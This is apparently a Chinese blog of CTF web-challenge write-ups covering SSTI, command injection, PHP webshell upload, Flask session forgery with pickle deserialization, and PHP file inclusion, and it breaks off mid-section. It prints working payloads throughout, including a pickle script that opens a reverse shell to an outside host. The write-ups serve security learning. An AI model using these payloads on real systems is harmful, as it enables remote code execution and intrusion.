<h4 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h4><p><em>fd是一个目录，里面包含着当前进程打开的每一个文件的描述符（file descriptor）差不多就是路径啦，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以我们可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容</em><br>特别指出，当linux使用<code>open</code>打开一个文件时，只要没有关闭，即使被删除仍然保留在fd中，可以被复原。</p>
<h4 id="self"><a href="#self" class="headerlink" title="self"></a>self</h4><p>特殊访问当前使用的进程信息<br>通过题目所在程序的进程才能进入题目程序的self文件夹</p>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>首先试图获取该进程的pid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nickname=&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;ps&quot;)[&quot;read&quot;]()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到<code>PID USER TIME COMMAND 1 root 0:04 python app.py 34 root 0:00 ps</code><br>获得文件序号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname=&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;ls -al /proc/1/fd&quot;)[&quot;read&quot;]()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到<code>total 0 dr-x------ 2 root root 0 Mar 9 04:34 . dr-xr-xr-x 9 root root 0 Mar 9 04:34 .. lrwx------ 1 root root 64 Mar 9 04:34 0 -&gt; /dev/null l-wx------ 1 root root 64 Mar 9 04:34 1 -&gt; pipe:[2276765047] l-wx------ 1 root root 64 Mar 9 04:34 2 -&gt; pipe:[2276765048] lr-x------ 1 root root 64 Mar 9 04:34 3 -&gt; /app/flag (deleted) lrwx------ 1 root root 64 Mar 9 04:34 4 -&gt; socket:[2276781174] lrwx------ 1 root root 64 Mar 9 04:34 5 -&gt; socket:[2281627971] lr-x------ 1 root root 64 Mar 9 04:34 6 -&gt; pipe:[2281626241] </code><br>复原文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nickname=&#123;&#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[127][&quot;\x5f\x5finit\x5f\x5f&quot;][&quot;\x5f\x5fglobals\x5f\x5f&quot;][&quot;popen&quot;](&quot;cat /proc/1/fd/3&quot;)[&quot;read&quot;]()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>获得flag</p>
<hr>
<p>更进一步<br>使用_frozen_importlib_external.FileLoader这个类，然后用get_data读取/proc/self/fd/3读取flag文件</p>
<h2 id="第三章-web进阶-SSTI"><a href="#第三章-web进阶-SSTI" class="headerlink" title="[第三章 web进阶]SSTI"></a>[第三章 web进阶]SSTI</h2><p>在password存在注入点<br>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://510a814d-3328-4d63-ac87-2e4b4317d2c7.node4.buuoj.cn:81/?password=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;/&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>查看app文件夹<br>查看源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://510a814d-3328-4d63-ac87-2e4b4317d2c7.node4.buuoj.cn:81/?password=&#123;&#123;config.__class__.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/app/server.py&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="GKCTF-2021-签到"><a href="#GKCTF-2021-签到" class="headerlink" title="[GKCTF 2021]签到"></a>[GKCTF 2021]签到</h2><p>wireshark练手<br>将流量文件通过wireshark打开<br>观察后发现是一道web题的作答过程，在请求包中发现<code>ls</code> <code>cat flag</code><br>找到第5个http响应包，获得16进制数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">64306c455357644251306c6e51554e4a5a3046355355737764306c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154576c44546d39525241707154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7154586c4a616b31355357704e65556c7162314645616b46445357644251306c6e51554e4a5a32644554545a46524530325157704e5a3046365458524e524531305257704e436e5177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d644442705130354e65556c7154586c4a616b31355357704e65556b4b4e6b467154576442656b31305455524e644556715458644a616b38775a566f324d6d56774e557377643074795556645a64315a485a48593152556c3051576c4e4d5546355a4777316255733254545a7162475a7763573579555552304d464e4d64444254544170304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d6444425454485177553078304d464e4d537a42425357526159585a764e7a567462485a735130354e564530325255524e436e6f77655531334d464e4e6555467154545a524e327877596a647362584a5252484a7a5131706f516c68614d446c745647637751306c355655524a4d315a74596e4676656d3951567974736357563151303477553078304d464e4d64444254544851775530774b63336858576d786b4d5659354d544e6c4e325179576d684752324a7a576d31615a7a427363446c7064573569567974585a7a427363446c7064573569567974585a7a427363446c706457356956797458537a423354586876564531336230524e6555464454517045546a4252524534775555527356324636546c684e65444258596d593562464a48556b524f5245347759584a6b4d464a6d4f565a6162444658596e644252456c6b556d46746345524c61577832526b6c6b556d46746345524c61577832566b747754544a5a436a303955556c6f545442525245347755516f3d</span><br></pre></td></tr></table></figure>
<p>通过chef解码尝试后，是16进制+base64+翻转+base64+行翻转<br>解码后获得双写的flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--------------------------------------------21-03-30 20:01:08         #</span><br><span class="line">时间:2021-03-30 20:###########</span><br><span class="line">窗口:*new 52 - Notepad++</span><br><span class="line">---------------------------------------------</span><br><span class="line">[回车] </span><br><span class="line">时间:2021-03-301:13</span><br><span class="line">窗口:*new 52 - Notepad++</span><br><span class="line">[回车] [回车] [回车] ffllaagg&#123;&#123;&#125;&#125;WWeell-----------</span><br><span class="line">CCCCC!!cc))[删除] [删除] 00mmee__GGkkCC44FF__mm11ssiiCCCCCCC0 20:01:13</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>去除双写后得到flag</p>
<h2 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h2><p>页面信息</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm1&#x27;</span>];</span><br><span class="line"><span class="variable">$comm2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;comm2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;</span>, <span class="variable">$comm1</span>))</span><br><span class="line">    <span class="variable">$comm1</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&quot;/\&#x27;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;</span>, <span class="variable">$comm2</span>))</span><br><span class="line">    <span class="variable">$comm2</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;#flag in /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$comm1</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm1</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"><span class="variable">$comm2</span> = <span class="string">&#x27;&quot;&#x27;</span> . <span class="variable">$comm2</span> . <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;file <span class="subst">$comm1</span> <span class="subst">$comm2</span>&quot;</span>;</span><br><span class="line">system(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">cannot open `<span class="string">&#x27; (No such file or directory) cannot open `&#x27;</span> (No such file <span class="keyword">or</span> <span class="built_in">directory</span>) </span><br></pre></td></tr></table></figure>
<p>comm1没有过滤<code>;</code>，可以拼接命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?comm1=index.php&quot;;tac /fla?;&quot;</span><br></pre></td></tr></table></figure>
<p>不知道comm2有什么用，可能这不是正解。</p>
<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><p>页面信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">function check($input)&#123;</span><br><span class="line">    if(preg_match(&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;,$input))&#123;</span><br><span class="line">        // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br><span class="line">        die(&#x27;hacker!!!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf($input)&#123;</span><br><span class="line">  if(is_array($input))&#123;</span><br><span class="line">      foreach($input as $key=&gt;$output)&#123;</span><br><span class="line">          $input[$key] = waf($output);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">      $input = check($input);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . &#x27;/&#x27;;</span><br><span class="line">if(!file_exists($dir))&#123;</span><br><span class="line">    mkdir($dir);</span><br><span class="line">&#125;</span><br><span class="line">switch($_GET[&quot;action&quot;] ?? &quot;&quot;) &#123;</span><br><span class="line">    case &#x27;pwd&#x27;:</span><br><span class="line">        echo $dir;</span><br><span class="line">        break;</span><br><span class="line">    case &#x27;upload&#x27;:</span><br><span class="line">        $data = $_GET[&quot;data&quot;] ?? &quot;&quot;;</span><br><span class="line">        waf($data);</span><br><span class="line">        file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>pwd可以获得shell的位置<br>需要绕过一个waf<br>可以使用短标签<code>&lt;?echo?&gt;</code>写入php语句<br>使用反引号写入shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?echo%09`ls%09/`?&gt;</span><br></pre></td></tr></table></figure>
<p>发现可疑文件 flllllll1112222222lag </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=upload&amp;data=&lt;?echo%09`cat%09/flllllll1112222222lag`?&gt;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="HFCTF-2021-Final-easyflask-1"><a href="#HFCTF-2021-Final-easyflask-1" class="headerlink" title="[HFCTF 2021 Final]easyflask 1"></a>[HFCTF 2021 Final]easyflask 1</h2><p>根据提示获得源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):<span class="comment">#如果u对应的值是字典，会读取  u.b</span></span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)<span class="comment">#pickle反序列化</span></span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>黑名单ban掉了<br>通过进程查询环境config</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file?file=/proc/self/environ</span><br><span class="line">binsecret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh</span><br></pre></td></tr></table></figure>
<p>做到这里就没有头绪了<br>记录一下wp以后在研究</p>
<hr>
<p>很明显的一个session伪造加pickle反序列化rce。<br>从/proc/self/environ 获取环境变量,里面有secret_key可以拿这个secret_key伪造session。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">from base64 import b64encode</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">User = type(&#x27;User&#x27;, (object,), &#123;</span><br><span class="line">    &#x27;uname&#x27;: &#x27;tyskill&#x27;,</span><br><span class="line">    &#x27;is_admin&#x27;: 0,</span><br><span class="line">    &#x27;__repr__&#x27;: lambda o: o.uname,</span><br><span class="line">    &#x27;__reduce__&#x27;: lambda o: (os.system, (&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.1.1/2333 0&gt;&amp;1&#x27;&quot;,))</span><br><span class="line">&#125;)</span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line">print(b64encode(u).decode())</span><br></pre></td></tr></table></figure>
<p>命令执行那换上自己vps的ip，不过得在linux中运行这个脚本（我在kali用得是python2.7，发现python3和2出来的又不一样），不然生成得base64会出错，导致伪造得ssesion反序列化失败。<br>利用flask-unsign这个工具生成恶意session<br>带着这个session去访问/admin，然后服务器监听即可。</p>
<hr>
<h2 id="NPUCTF2020-EZINCLUDE"><a href="#NPUCTF2020-EZINCLUDE" class="headerlink" title="NPUCTF2020-EZINCLUDE"></a>NPUCTF2020-EZINCLUDE</h2><p>查看源代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;head&gt;&lt;/head&gt;&lt;body&gt;username/password error</span><br><span class="line">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
<p>提示将secret和name串联之后在经过md5加密和pass相同<br>其实secret已经给出，就是返回的hash值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&amp;pass=fa25e54758d5d5c1927781a6ede89f8a</span><br></pre></td></tr></table></figure>
<p>直接定向到了404页面<br>打开bp<br>果然存在一个中间页面</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span><br><span class="line">           window.location.href=&quot;404.html&quot;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_出题人_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">include($_GET[&quot;file&quot;])&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结合题目可能存在include文件包含漏洞<br>利用filter伪协议获得php代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>;</span><br><span class="line">@<span class="variable">$name</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">@<span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;script language=&quot;javascript&quot; type=&quot;text/javascript&quot;&gt;</span></span><br><span class="line"><span class="string">           window.location.href=&quot;flflflflag.php&quot;;</span></span><br><span class="line"><span class="string">	&lt;/script&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	setcookie(<span class="string">&quot;Hash&quot;</span>,md5(<span class="variable">$secret</span>.<span class="variable">$name</span>),time()+<span class="number">3600000</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;username/password error&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!--md5(<span class="variable">$secret</span>.<span class="variable">$name</span>)===<span class="variable">$pass</span> --&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>flflflflag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script language=<span class="string">&quot;javascript&quot;</span> type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">           window.location.href=<span class="string">&quot;404.html&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;this_is_not_fl4g_and_åºé¢äºº_wants_girlfriend&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/data|input|zip/is&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;nonono&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;include($_GET[&quot;file&quot;])&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG.PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$secret=&#x27;%^$&amp;$#fffdflag_is_not_here_ha_ha&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>ban掉了可以直接写shell的伪协议，使用php7 的segment fault特性<br><em>php://filter/string.strip_tags=/etc/passwd<br>php执行过程中出现 Segment Fault，这样如果在此同时上传文件，那么临时文件就会被保存在/tmp目录，不会被删除</em><br>使用python脚本</p>
